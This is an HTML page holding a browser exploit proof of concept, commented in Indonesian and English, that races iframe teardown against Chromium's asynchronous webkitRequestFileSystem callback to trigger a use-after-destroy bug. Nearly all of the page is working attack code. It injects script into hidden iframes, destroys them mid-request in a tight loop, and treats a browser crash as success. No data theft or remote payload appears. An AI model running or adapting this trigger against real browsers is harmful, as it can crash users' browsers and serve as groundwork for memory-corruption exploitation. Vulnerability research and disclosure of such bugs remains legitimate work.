<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DOMWindow FileSystem UAF PoC</title>
    <style>
        body { 
            font-family: 'Consolas', monospace; 
            background: #0a0a0a; 
            color: #c9d1d9; 
            padding: 20px; 
        }
        h1 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        #controls { 
            background: #161b22; 
            padding: 15px; 
            border-radius: 6px; 
            margin: 15px 0;
            border: 1px solid #30363d;
        }
        button { 
            padding: 10px 20px; 
            margin: 5px; 
            cursor: pointer; 
            font-weight: bold; 
            border: none; 
            border-radius: 4px;
            font-size: 14px;
        }
        #btnStart { background: #238636; color: white; }
        #btnStop { background: #da3633; color: white; }
        #btnClear { background: #30363d; color: #c9d1d9; }
        
        #stats { 
            display: flex; 
            gap: 20px; 
            margin: 10px 0; 
            font-size: 13px;
        }
        .stat-box { 
            background: #21262d; 
            padding: 8px 12px; 
            border-radius: 4px;
            border: 1px solid #30363d;
        }
        .stat-label { color: #8b949e; }
        .stat-value { color: #58a6ff; font-weight: bold; }
        
        #log { 
            background: #010409; 
            border: 1px solid #30363d; 
            border-radius: 6px;
            height: 400px; 
            overflow-y: auto; 
            padding: 10px; 
            font-size: 11px;
            white-space: pre-wrap;
        }
        .log-entry { margin: 2px 0; }
        .log-js { color: #7ee787; }
        .log-cpp { color: #ffa657; }
        .log-race { color: #ff7b72; font-weight: bold; }
        .log-error { color: #f85149; }
        .log-success { color: #3fb950; }
        .log-info { color: #8b949e; }
        .log-crit { color: #d2a8ff; font-weight: bold; }
        
        #iframe-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        code { 
            background: #6e768130; 
            padding: 2px 6px; 
            border-radius: 3px;
        }
    </style>
</head>
<body>

    <h1>üî¨ DOMWindow FileSystem Use-After-Destroy PoC</h1>
    <p>Target: <code>DOMWindowFileSystem::webkitRequestFileSystem</code> (Async)</p>
    <p>Trigger: <code>iframe navigation/remove</code> sebelum callback async return</p>

    <div id="controls">
        <button id="btnStart" onclick="startAttack()">‚ñ∂ Start Race Attack</button>
        <button id="btnStop" onclick="stopAttack()">‚èπ Stop</button>
        <button id="btnClear" onclick="clearLog()">üóë Clear Log</button>
        
        <div id="stats">
            <div class="stat-box"><span class="stat-label">Iterations:</span> <span class="stat-value" id="statIter">0</span></div>
            <div class="stat-box"><span class="stat-label">Callbacks Fired:</span> <span class="stat-value" id="statCb">0</span></div>
            <div class="stat-box"><span class="stat-label">Crashes:</span> <span class="stat-value" id="statCrash">0</span></div>
            <div class="stat-box"><span class="stat-label">Status:</span> <span class="stat-value" id="statStatus">IDLE</span></div>
        </div>
    </div>

    <div id="log"></div>
    
    <!-- Container untuk iframe yang akan dibuat/dihancurkan -->
    <div id="iframe-container"></div>

    <script>
        // ========================================
        // STATE GLOBAL
        // ========================================
        let isRunning = false;
        let iteration = 0;
        let callbacksFired = 0;
        let crashCount = 0;
        
        // DOM references
        const logDiv = document.getElementById('log');
        const statIter = document.getElementById('statIter');
        const statCb = document.getElementById('statCb');
        const statCrash = document.getElementById('statCrash');
        const statStatus = document.getElementById('statStatus');
        const btnStart = document.getElementById('btnStart');
        const iframeContainer = document.getElementById('iframe-container');
        
        // ========================================
        // LOGGING UTILITIES
        // ========================================
        function log(msg, cls = 'log-info') {
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + cls;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function clearLog() {
            logDiv.innerHTML = '';
            iteration = 0;
            callbacksFired = 0;
            crashCount = 0;
            updateStats();
            log('Log cleared', 'log-info');
        }
        
        function updateStats() {
            statIter.textContent = iteration;
            statCb.textContent = callbacksFired;
            statCrash.textContent = crashCount;
        }
        
        function setStatus(status, cls = '') {
            statStatus.textContent = status;
            statStatus.className = 'stat-value ' + cls;
        }
        
        // ========================================
        // CHECK API AVAILABILITY
        // ========================================
        function checkAPI() {
            const hasAPI = typeof window.webkitRequestFileSystem !== 'undefined' ||
                          typeof window.webkitPersistentStorage !== 'undefined';
            
            if (!hasAPI) {
                log('‚ö†Ô∏è WebKit FileSystem API TIDAK tersedia di browser ini', 'log-error');
                log('Coba Chrome versi < 100 atau flag: --enable-experimental-web-platform-features', 'log-info');
                return false;
            }
            
            log('‚úÖ FileSystem API terdeteksi', 'log-success');
            return true;
        }
        
        // ========================================
        // ATTACK CONTROL
        // ========================================
        function startAttack() {
            if (isRunning) return;
            
            if (!checkAPI()) {
                log('API tidak tersedia. Attack dibatalkan.', 'log-error');
                return;
            }
            
            isRunning = true;
            iteration = 0;
            callbacksFired = 0;
            crashCount = 0;
            updateStats();
            setStatus('RACING...', 'log-success');
            btnStart.disabled = true;
            
            log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'log-info');
            log('üöÄ Starting DOMWindow Race Attack', 'log-success');
            log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'log-info');
            log('[Flow-1] Target: window.webkitRequestFileSystem', 'log-js');
            log('[Flow-2] Entry: DOMWindowFileSystem::webkitRequestFileSystem', 'log-cpp');
            log('[Flow-4] Async: LocalFileSystem::RequestFileSystem(kAsynchronous)', 'log-cpp');
            log('[Flow-5A] Race: iframe navigation/remove BEFORE callback', 'log-race');
            log('[Flow-6-7] Bug: Callback on destroyed ExecutionContext', 'log-crit');
            log('');
            
            // Request quota first (agar IPC benar-benar terjadi)
            requestQuotaAndStart();
        }
        
        function stopAttack() {
            if (!isRunning) return;
            isRunning = false;
            setStatus('STOPPED', 'log-error');
            btnStart.disabled = false;
            log('');
            log('üõë Attack stopped by user', 'log-error');
            log('Final: ' + iteration + ' iterations, ' + callbacksFired + ' callbacks', 'log-info');
        }
        
        // ========================================
        // QUOTA REQUEST (Pre-condition)
        // ========================================
        function requestQuotaAndStart() {
            if (window.webkitPersistentStorage) {
                log('[Pre] Requesting storage quota...', 'log-info');
                window.webkitPersistentStorage.requestQuota(
                    10 * 1024 * 1024, // 10MB
                    function(granted) {
                        log('[Pre] Quota granted: ' + granted + ' bytes', 'log-success');
                        log('Starting race loop...', 'log-info');
                        loopAttack();
                    },
                    function(err) {
                        log('[Pre] Quota request failed, continuing anyway...', 'log-warn');
                        loopAttack();
                    }
                );
            } else {
                log('[Pre] No quota API, starting direct attack...', 'log-warn');
                loopAttack();
            }
        }
        
        // ========================================
        // RACE CONDITION LOOP (Inti PoC)
        // ========================================
        async function loopAttack() {
            while (isRunning) {
                iteration++;
                updateStats();
                
                // [Flow-1] Buat iframe baru = ExecutionContext baru
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframeContainer.appendChild(iframe);
                
                const iframeId = `IF-${iteration}`;
                log(`[${iframeId}] [Flow-1] Created iframe (new ExecutionContext)`, 'log-js');
                
                const win = iframe.contentWindow;
                const doc = iframe.contentDocument;
                
                // [Flow-1] Inject script yang memanggil webkitRequestFileSystem
                // Ini akan trigger: DOMWindowFileSystem::webkitRequestFileSystem
                const scriptCode = `
                    (function() {
                        var id = '${iframeId}';
                        
                        function log(msg) {
                            window.parent.postMessage({
                                type: 'iframe-log',
                                id: id,
                                message: msg
                            }, '*');
                        }
                        
                        try {
                            // [Flow-1] Call API
                            log('[IF-1] Calling webkitRequestFileSystem...');
                            
                            if (typeof webkitRequestFileSystem !== 'undefined') {
                                webkitRequestFileSystem(
                                    TEMPORARY,
                                    1024 * 1024,  // 1MB request
                                    function successCallback(filesystem) {
                                        // [Flow-7] Callback dipanggil
                                        // ‚ö†Ô∏è RACE: Jika iframe sudah navigate/remove,
                                        // context sudah destroyed tapi callback tetap jalan
                                        window.parent.postMessage({
                                            type: 'callback-success',
                                            id: id,
                                            fsName: filesystem ? filesystem.name : 'null',
                                            timestamp: Date.now()
                                        }, '*');
                                        log('[IF-7] ‚úÖ SUCCESS callback fired!');
                                    },
                                    function errorCallback(error) {
                                        window.parent.postMessage({
                                            type: 'callback-error',
                                            id: id,
                                            code: error.code,
                                            timestamp: Date.now()
                                        }, '*');
                                        log('[IF-7b] ‚ùå ERROR callback: ' + error.code);
                                    }
                                );
                                log('[IF-4] Async request dispatched');
                            } else {
                                log('[IF-ERR] API not available in iframe');
                            }
                        } catch (e) {
                            log('[IF-EXCEPTION] ' + e.message);
                        }
                    })();
                `;
                
                // Inject dan eksekusi script di iframe
                const scriptEl = doc.createElement('script');
                scriptEl.textContent = scriptCode;
                doc.body.appendChild(scriptEl);
                
                log(`[${iframeId}] [Flow-2-4] Script injected, API called (async dispatched)`, 'log-cpp');
                
                // ========================================
                // [Flow-5A] RACE TRIGGER - Hancurkan Context!
                // ========================================
                // Strategi: Multiple destruction methods untuk memastikan context teardown
                
                // Method 1: Navigasi ke about:blank (paling agresif untuk teardown)
                iframe.src = 'about:blank';
                log(`[${iframeId}] [Flow-5A] üí• iframe.src = 'about:blank' (navigation trigger)`, 'log-race');
                
                // Method 2: Remove dari DOM (trigger GC)
                // Delay sangat kecil agar navigation sempat diproses dulu
                setTimeout(() => {
                    if (iframe.parentNode) {
                        iframe.parentNode.removeChild(iframe);
                        log(`[${iframeId}] [Flow-5A] üí• iframe.remove() (DOM detach)`, 'log-race');
                    }
                }, 1);
                
                // Method 3: Nullify references
                // win = null; doc = null; // (otomatis handled oleh GC)
                
                // ========================================
                // Yield ke event loop (tanpa delay untuk race lebih ketat)
                // ========================================
                await new Promise(resolve => setTimeout(resolve, 0));
                
                // Logging periodik
                if (iteration % 50 === 0) {
                    log(`[Main] Iteration ${iteration}... race window active`, 'log-info');
                }
            }
        }
        
        // ========================================
        // MESSAGE HANDLER (Untuk callback dari iframe)
        // ========================================
        window.addEventListener('message', (e) => {
            const data = e.data;
            
            if (data.type === 'iframe-log') {
                log(`[${data.id}] ${data.message}`, 'log-js');
            } 
            else if (data.type === 'callback-success' || data.type === 'callback-error') {
                callbacksFired++;
                updateStats();
                
                // ‚ö†Ô∏è CRITICAL: Jika callback fired setelah iframe di-destroy,
                // ini indikasi bug lifecycle!
                log(`[${data.id}] ‚ö†Ô∏è CALLBACK FIRED POST-DESTROY! type=${data.type}`, 'log-crit');
                
                if (data.type === 'callback-success') {
                    log(`[${data.id}] Filesystem: ${data.fsName}`, 'log-crit');
                }
            }
        });
        
        // ========================================
        // CLEANUP
        // ========================================
        window.addEventListener('beforeunload', () => {
            iframeContainer.innerHTML = '';
            log('[Main] Cleanup complete', 'log-info');
        });
        
        // Auto-info on load
        log('üëâ Klik "Start Race Attack" untuk memulai', 'log-info');
        log('üìä Pantau "Callbacks Fired" - jika ada callback setelah destroy = bug', 'log-info');
        log('üí• Browser crash = bug berhasil (cek chrome://crashes)', 'log-info');
    </script>
</body>
</html>
